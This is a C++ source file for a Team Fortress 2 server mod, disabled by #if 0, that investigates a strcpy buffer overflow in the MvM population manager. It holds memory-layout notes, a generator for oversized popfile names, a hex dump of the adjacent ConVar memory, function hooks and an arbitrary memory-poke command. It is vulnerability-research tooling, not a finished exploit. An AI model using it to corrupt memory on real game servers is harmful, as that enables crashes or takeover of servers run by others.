#if 0

#include "mod.h"
#include "stub/populators.h"
#include "addr/addr.h"
#include "util/scope.h"


/* the full path must be 259 chars long:
/pool/Game/SteamCMD/tf2/tf/custom/d/scripts/population/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.pop
/pool/Game/SteamCMD/tf2/tf/custom/d/scripts/population/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]
*/

/*
ServerLinux 20160531a
+0x0000 s_pszNextPopfile
+0x0104 <padding>
+0x0120 tf_grapplinghook_enable
+0x0180 tf_mvm_buybacks_per_wave
+0x01e0 tf_mvm_buybacks_method
+0x0240 tf_mvm_respec_credit_goal
+0x02a0 tf_mvm_respec_limit
+0x0300 tf_mvm_respec_enabled

ServerWin 20160531a
TODO

ClientOSX 20160531a
(TODO: relative offsets)
+0x0000 00f1f230 s_pszNextPopfile
+0x0104 00f1f334 hide_server
+0x0160 00f1f390 mp_waitingforplayers_time
+0x01bc 00f1f3ec tf_gamemode_arena
+0x0218 00f1f448 tf_gamemode_cp
+0x0000 00f1f4a4 tf_gamemode_ctf
+0x0000 00f1f500 tf_gamemode_sd
+0x0000 00f1f55c tf_gamemode_rd
+0x0000 00f1f5b8 tf_gamemode_pd
+0x0000 00f1f614 tf_gamemode_tc
+0x0000 00f1f670 tf_beta_content
+0x0000 00f1f6cc tf_gamemode_payload
+0x0000 00f1f728 tf_gamemode_mvm
+0x0000 00f1f784 tf_gamemode_passtime
+0x0000 00f1f7e0 tf_gamemode_misc
+0x0000 00f1f83c tf_bot_count
+0x0000 00f1f898 tf_teamtalk
+0x0000 00f1f8f4 tf_ctf_bonus_time
+0x0000 00f1f950 tf_skillrating_debug
+0x0000 00f1f9ac tf_competitive_mode
+0x0000 00f1fa08 tf_competitive_preround_duration
+0x0000 00f1fa64 tf_competitive_preround_countdown_duration
+0x0000 00f1fac0 tf_competitive_abandon_method
+0x0000 00f1fb1c tf_powerup_mode
+0x0000 00f1fb78 tf_powerup_mode_imbalance_delta


ConVar 20160531a
+0x00 vtable
+0x04 ConCommandBase *m_pNext
+0x08 bool m_bRegistered
+0x0c const char *m_pszName
+0x10 const char *m_pszHelpString
+0x14 int m_nFlags
+0x18 ConVar *m_pParent
+0x1c const char *m_pszDefaultValue
+0x20 char *m_pszString
+0x24 int m_StringLength
+0x28 float m_fValue
+0x2c int m_nValue
+0x30 bool m_bHasMin
+0x34 float m_fMinVal
+0x38 bool m_bHasMax
+0x3c float m_fMaxVal
+0x40 ...
+0x44 ...
+0x48 ...
+0x4c ...
+0x50 ...
+0x54 ...
+0x58 FnChangeCallback_t m_fnChangeCallback
+0x5c ...

ConCommand 20160531a
+0x00 vtable
+0x04 ConCommandBase *m_pNext
+0x08 bool m_bRegistered
+0x0c const char *m_pszName
+0x10 const char *m_pszHelpString
+0x14 int m_nFlags
+0x18 FnCommandCallback_t m_fnCommandCallback
+0x1c FnCommandCompletionCallback m_fnCompletionCallback
+0x20 bool m_bHasCompletionCallback         : 1
+0x20 bool m_bUsingNewCommandCallback       : 1
+0x20 bool m_bUsingCommandCallbackInterface : 1
+0x24 ...
+0x28 ...
+0x2c ...
+0x30 ...
+0x34 ...
+0x38 ...
+0x3c ...

*/


// VPK file loading is probably our best bet
// but it'll require the hacked vpk binary to create filenames > MAX_PATH

// string hazards:
// no '\0' bytes
// we should probably take advantage of KeyValues's escaping feature if possible

// FileExists notes:
// all '\\' (0x5c) chars will get converted to '/' (0x2f)
// any double-slash sequences will be converted to single-slashes
// all chars in A-Z range (0x41-0x5a) will be lowercased (+0x20)
// chars in the 0x80-0xff MIGHT be lowercased by libc's tolower, depending on locale!


namespace Mod::Debug::PopMgr_Exploit
{
	const char *GenerateString(int len)
	{
		auto str = new char[len + 1];
		memset(str, 'A', len);
		str[len] = '\0';
		
		return str;
	}
	
	
	CON_COMMAND(sig_debug_popmgr_exploit_generate, "")
	{
		for (int i = 1; i < 300; ++i) {
			const char *str = GenerateString(i);
			
			char buf[1024];
			snprintf(buf, sizeof(buf), "tf/custom/mapcycle/scripts/population/%s", str);
			
			int fd = creat(buf, 0644);
			if (fd < 0) {
			//	DevMsg("creat failed for \"%s\":\n%s\n", strerror(errno));
			} else {
				close(fd);
			}
			
			delete str;
		}
	}
	
	
	bool LoadMission(int len)
	{
		const char *str = GenerateString(len);
		
		auto kv = new KeyValues("1");
		kv->SetString("map", "mvm_decoy");
		kv->SetString("popfile", str);
		
		bool result = g_pPopulationManager->LoadMvMMission(kv);
		
		kv->deleteThis();
		delete str;
		
		return result;
	}
	
	
	CON_COMMAND(sig_debug_popmgr_exploit_run, "")
	{
		if (args.ArgC() < 2) {
			Warning("Insufficient arguments\n");
			return;
		}
		
		int len = std::stoi(args[1], nullptr, 0);
		DevMsg("Setting popfile strlen to %d / 0x%x\n", len, len);
		
		if (LoadMission(len)) {
			DevMsg("SUCCESS\n");
		} else {
			DevMsg("FAILURE\n");
		}
	}
	
	
	struct UNKNOWN_0x24
	{
		uint8_t pad[0x24];
	};
	SIZE_CHECK(UNKNOWN_0x24, 0x24);
	
	DETOUR_DECL_MEMBER(UNKNOWN_0x24, CPackedStore_OpenFile, const char *path)
	{
		ConColorMsg(Color(0xff, 0x00, 0xff, 0xff), "CPackedStore::OpenFile: \"%s\"\n", path);
		return DETOUR_MEMBER_CALL(CPackedStore_OpenFile)(path);
	}
	
	
	////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////
	
	
	const char *MakePrintable(const char *str)
	{
		static /*thread_local*/ std::vector<char> printable;
		
		if (str == nullptr) return str;
		if (str[0] == '\0') return str;
		
		size_t len = strlen(str);
		
		printable.clear();
		for (size_t i = 0; i < len; ++i) {
			if (isprint(str[i])) {
				printable.push_back(str[i]);
			} else {
				uint8_t c = str[i];
				
				unsigned int n_hi = (c >> 4) & 0x0f;
				unsigned int n_lo = (c >> 0) & 0x0f;
				
				printable.push_back('\\');
				printable.push_back('x');
				
				if (n_hi < 10) printable.push_back('0' + n_hi);
				else           printable.push_back('A' + (n_hi - 10));
				
				if (n_lo < 10) printable.push_back('0' + n_lo);
				else           printable.push_back('A' + (n_lo - 10));
			}
		}
		printable.push_back('\0');
		
		return printable.data();
	}
	
	
	void DumpMem()
	{
		constexpr ptrdiff_t OFF_BUFFER  = 0x0000;
		constexpr ptrdiff_t OFF_PAD     = 0x0104;
		constexpr ptrdiff_t OFF_CONVAR1 = 0x0120;
		constexpr ptrdiff_t OFF_CONVAR2 = 0x0180;
		constexpr ptrdiff_t OFF_CONVAR3 = 0x01E0;
		constexpr ptrdiff_t OFF_MAX     = 0x0240;
		static_assert(OFF_MAX % 16 == 0);
		
		static auto s_pszNextPopfile = reinterpret_cast<uintptr_t>(AddrManager::GetAddr("s_pszNextPopfile"));
		
		static auto pConVar1 = reinterpret_cast<const ConVar *>(s_pszNextPopfile + OFF_CONVAR1);
		static auto pConVar2 = reinterpret_cast<const ConVar *>(s_pszNextPopfile + OFF_CONVAR2);
		static auto pConVar3 = reinterpret_cast<const ConVar *>(s_pszNextPopfile + OFF_CONVAR3);
		
		static const std::string cvar1_name = pConVar1->GetName();
		static const std::string cvar2_name = pConVar2->GetName();
		static const std::string cvar3_name = pConVar3->GetName();
		
		static const Color c_gray   (0xc0, 0xc0, 0xc0, 0xff);
		static const Color c_white  (0xff, 0xff, 0xff, 0xff);
		static const Color c_red    (0xff, 0x00, 0x00, 0xff);
		static const Color c_orange (0xff, 0x80, 0x00, 0xff);
		static const Color c_yellow (0xff, 0xff, 0x00, 0xff);
		static const Color c_green  (0x00, 0xff, 0x00, 0xff);
		static const Color c_cyan   (0x00, 0xff, 0xff, 0xff);
		static const Color c_blue   (0x00, 0x00, 0xff, 0xff);
		static const Color c_magenta(0xff, 0x00, 0xff, 0xff);
		
		char ascii[17];
		ascii[16] = '\0';
		const Color *ascii_color[16];
		
		for (int i = 0; i < 16; ++i) {
			switch (i) {
			case 0:  ConColorMsg(c_gray, "======================"); break;
			case 8:  ConColorMsg(c_gray, "==");                     break;
			default: ConColorMsg(c_gray, "=");                      break;
			}
			
			ConColorMsg(c_white, "+%01X", i);
			
			if (i == 15) ConColorMsg(c_gray, "====================\n");
		}
		
		for (ptrdiff_t i = OFF_BUFFER; i < OFF_MAX; ++i) {
			if (i % 16 == 0) {
				ConColorMsg(c_gray, "0x%08x | +0x%03x: ", s_pszNextPopfile + i, i);
			}
			
			auto byte = *reinterpret_cast<uint8_t *>(s_pszNextPopfile + i);
			
			const Color *c = &c_gray;
			if (i < OFF_PAD) {
				c = &c_cyan;
			} else if (i < OFF_CONVAR1) {
				c = &c_green;
			} else if (i < OFF_CONVAR2) {
				c = &c_yellow;
			} else if (i < OFF_CONVAR3) {
				c = &c_orange;
			} else {
				c = &c_red;
			}
			
			if (isgraph(byte)) {
				ascii[i % 16] = byte;
			} else {
				ascii[i % 16] = '.';
			}
			ascii_color[i % 16] = c;
			
			ConColorMsg(*c, "%*s%02x", (i % 16 == 8 ? 2 : 1), " ", byte);
			
			if (i % 16 == 15) {
				ConColorMsg(c_white, "  |");
				for (int j = 0; j < 16; ++j) {
					ConColorMsg(*ascii_color[j], "%c", ascii[j]);
				}
				ConColorMsg(c_white, "|");
				
				if ((i / 16) == (OFF_BUFFER  / 16)) ConColorMsg(c_cyan,   " <-- s_pszNextPopfile");
				if ((i / 16) == (OFF_PAD     / 16)) ConColorMsg(c_green,  " <-- padding");
				if ((i / 16) == (OFF_CONVAR1 / 16)) ConColorMsg(c_yellow, " <-- ConVar %s", cvar1_name.c_str());
				if ((i / 16) == (OFF_CONVAR2 / 16)) ConColorMsg(c_orange, " <-- ConVar %s", cvar2_name.c_str());
				if ((i / 16) == (OFF_CONVAR3 / 16)) ConColorMsg(c_red,    " <-- ConVar %s", cvar3_name.c_str());
				
				ConColorMsg(c_white, "\n");
			}
		}
		
		for (int i = 0; i < 16; ++i) {
			switch (i) {
			case 0:  ConColorMsg(c_gray, "======================"); break;
			case 8:  ConColorMsg(c_gray, "==");                     break;
			default: ConColorMsg(c_gray, "=");                      break;
			}
			
			ConColorMsg(c_white, "+%01X", i);
			
			if (i == 15) ConColorMsg(c_gray, "====================\n");
		}
	}
	CON_COMMAND(sig_debug_popmgr_exploit_dumpmem, "") { DumpMem(); }
	
	
	////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////
	
	
	DETOUR_DECL_MEMBER(void, CTFGameRules_SetNextMvMPopfile, const char *popfile)
	{
		DevMsg("CTFGameRules::SetNextMvMPopfile PRE  \"%s\"\n", MakePrintable(popfile));
		DumpMem();
		
		DETOUR_MEMBER_CALL(CTFGameRules_SetNextMvMPopfile)(popfile);
		
		DevMsg("CTFGameRules::SetNextMvMPopfile POST \"%s\"\n", MakePrintable(popfile));
		DumpMem();
	}
	
	
	RefCount rc_LoadMvMMission;
	DETOUR_DECL_MEMBER(bool, CPopulationManager_LoadMvMMission, KeyValues *kv)
	{
		SCOPED_INCREMENT(rc_LoadMvMMission);
		
		DevMsg("CPopulationManager::LoadMvMMission PRE\n");
		auto result = DETOUR_MEMBER_CALL(CPopulationManager_LoadMvMMission)(kv);
		DevMsg("CPopulationManager::LoadMvMMission POST: %s\n", (result ? "TRUE" : "FALSE"));
		
		if (!result) {
			if (kv == nullptr) {
				DevMsg("  failed because kv was nullptr\n");
			}
			
			if (kv != nullptr) {
				const char *str_map     = kv->GetString("map");
				const char *str_popfile = kv->GetString("popfile");
				
				if (str_map == nullptr) {
					DevMsg("  failed because \"map\" value was nullptr\n");
				}
				if (str_popfile == nullptr) {
					DevMsg("  failed because \"popfile\" value was nullptr\n");
				}
			}
		}
		
		return result;
	}
	
	DETOUR_DECL_MEMBER(bool, CBaseFileSystem_FileExists, const char *pFileName, const char *pPathID)
	{
		auto result = DETOUR_MEMBER_CALL(CBaseFileSystem_FileExists)(pFileName, pPathID);
		
		if (rc_LoadMvMMission > 0) {
			DevMsg("CBaseFileSystem::FileExists(\"%s\", \"%s\") = %s\n", MakePrintable(pFileName), pPathID,
				(result ? "TRUE" : "FALSE"));
		}
		
		return result;
	}
	
	
	class CMod : public IMod
	{
	public:
		CMod() : IMod("Debug:PopMgr_Exploit")
		{
		//	MOD_ADD_DETOUR_MEMBER(CPackedStore_OpenFile, "CPackedStore::OpenFile");
			
			MOD_ADD_DETOUR_MEMBER(CTFGameRules_SetNextMvMPopfile, "CTFGameRules::SetNextMvMPopfile");
			
			MOD_ADD_DETOUR_MEMBER(CPopulationManager_LoadMvMMission, "CPopulationManager::LoadMvMMission");
			MOD_ADD_DETOUR_MEMBER(CBaseFileSystem_FileExists,        "CBaseFileSystem::FileExists");
		}
		
		virtual bool OnLoad() override
		{
			/* auto-enable as soon as possible if desired */
			if (CommandLine()->FindParm("-sig-popmgr-exploit")) {
				this->Enable();
			}
			
			return true;
		}
	};
	CMod s_Mod;
	
	
	ConVar cvar_enable("sig_debug_popmgr_exploit", "0", FCVAR_NOTIFY,
		"Debug: investigate a population manager related strcpy exploit",
		[](IConVar *pConVar, const char *pOldValue, float flOldValue){
			s_Mod.Toggle(static_cast<ConVar *>(pConVar)->GetBool());
		});
	
	
	CON_COMMAND(sig_debug_popmgr_exploit_poke, "")
	{
		static auto s_pszNextPopfile = reinterpret_cast<uintptr_t>(AddrManager::GetAddr("s_pszNextPopfile"));
		
		if (args.ArgC() < 3) return;
		
		uint32_t off = std::stoll(args[1], nullptr, 0);
		uint32_t val = std::stoll(args[2], nullptr, 0);
		
		DevMsg("Poking s_pszNextPopfile+0x%04x with value %08x\n", off, val);
		
		*reinterpret_cast<uint32_t *>(s_pszNextPopfile + off) = val;
	}
	
	
	CON_COMMAND(sig_debug_popmgr_exploit_convar_addr_by_name, "")
	{
		if (args.ArgC() < 2) return;
		
		ConVarRef cvref(args[1]);
		if (cvref.IsValid()) {
			Msg("ConVarRef(\"%s\"): 0x%08x\n", args[1], (uintptr_t)static_cast<ConVar *>(cvref.GetLinkedConVar()));
		} else {
			Warning("ConVarRef(\"%s\") was not valid.\n", args[1]);
		}
	}
}

// potentially useful ConVars which are accessed by name (e.g. non-static ConVarRef):
// "mp_allowspectators" in CTFPlayer::CheckForIdle
// "tf_gamemode_*"      in GetGameTypeID (lots of convars, and may be called every round!)
// bunch of stuff       in CTFGameStats::SW_WriteHostsRow (at level shutdown)
// "violence_agibs"     in CBaseCombatCharacter::Event_Gibbed
// "violence_hgibs"     in CBaseCombatCharacter::Event_Gibbed
// "mat_dxlevel"        in CBaseGameStats::Event_Init
// "mp_allowspectators" in CBasePlayer::ClientCommand for "spectate"

#endif
